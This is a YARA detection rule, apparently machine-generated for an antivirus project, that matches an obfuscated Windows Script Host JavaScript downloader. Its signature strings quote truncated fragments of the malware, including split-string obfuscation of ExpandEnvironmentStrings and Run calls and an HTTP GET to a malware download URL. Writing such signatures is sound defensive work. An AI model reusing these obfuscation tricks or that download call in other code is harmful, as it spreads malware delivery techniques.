rule sig_20160428_09919d8d162cf93460ec0a5d44ad8bd3 {
  meta:
    description = "datamaliciousorder - file 20160428_09919d8d162cf93460ec0a5d44ad8bd3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "36a59af62fb11a5bcf30a694a572359359123cf2b887d9b8339e0233c499bab3"

  strings:
    $s1  = "function VqaYikRksRmsUawAcwYwy() {return EdlJvbOiiYxpMdaHwjIye[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function KlzVyqIrkHxuSdaYliFgp(TnvSxkDbdNzfRcpAqiIaw){EdlJvbOiiYxpMdaHwjIye[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function KlzVyqIrkHxuSdaYliFgp(TnvSxkDbdNzfRcpAqiIaw){EdlJvbOiiYxpMdaHwjIye[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function KloHaaLimLsfVzeSenGcx(NqbAruJkdBqwLezBghAde, DsgXxrKcuSddVlwOnzFqn){IutJolFiiDesGlvVowAtc = IutJolFiiDesGlvVowAtc * 1; " ascii
    $s5  = "return NqbAruJkdBqwLezBghAde - DsgXxrKcuSddVlwOnzFqn;};" fullword ascii
    $s6  = "DotIoiNkcPitIzjOwsHti[WxvIxeJnkIjiVimMvtXmy](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s7  = "var BklBuzHyqNkcMlpRpjZdr = this[\"WScript\"];" fullword ascii
    $s8  = "function VqaYikRksRmsUawAcwYwy() {return EdlJvbOiiYxpMdaHwjIye[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function KloHaaLimLsfVzeSenGcx(NqbAruJkdBqwLezBghAde, DsgXxrKcuSddVlwOnzFqn){IutJolFiiDesGlvVowAtc = IutJolFiiDesGlvVowAtc * 1; " ascii
    $s10 = "var EdlJvbOiiYxpMdaHwjIye = function UicAofNxkHpyDzcXcqFkr() {return BklBuzHyqNkcMlpRpjZdr[AbaTkrYcuRpwJzhFybHow](\"WScript\"+\"" ascii
    $s11 = "if (DotIoiNkcPitIzjOwsHti[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function VpuTexFrnMjfShbPyzFfg(){return CfeLubBvsKocMnbMnpZva + \"\";};" fullword ascii
    $s13 = "function VulEfhTjxBrvItnUbtWpo() {return ((KqxJtrAgtPoeDigRizEzs == true) && (KqxJtrAgtPoeDigRizEzs == YegOthJtmWbnWpkOklVju)) ?" ascii
    $s14 = "function VulEfhTjxBrvItnUbtWpo() {return ((KqxJtrAgtPoeDigRizEzs == true) && (KqxJtrAgtPoeDigRizEzs == YegOthJtmWbnWpkOklVju)) ?" ascii
    $s15 = "var EdlJvbOiiYxpMdaHwjIye = function UicAofNxkHpyDzcXcqFkr() {return BklBuzHyqNkcMlpRpjZdr[AbaTkrYcuRpwJzhFybHow](\"WScript\"+\"" ascii
    $s16 = "}while (PscJcxOhqGwgMbtVeyOao);" fullword ascii
    $s17 = "KqxJtrAgtPoeDigRizEzs = true; " fullword ascii
    $s18 = "function RyjEmfYjmPdxAwpUtnHnu()" fullword ascii
    $s19 = "function MvlXnnFjnCtmBkhCqoIjb(){return 23;};" fullword ascii
    $s20 = "function HafEjeGisFwrBlzBluIpj(SbiDxsAzjDyiOvuMfmEfn) {var TxbJkmVmlGpmZrfWirYwe = (1, 2, 3, 4, 5, SbiDxsAzjDyiOvuMfmEfn); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}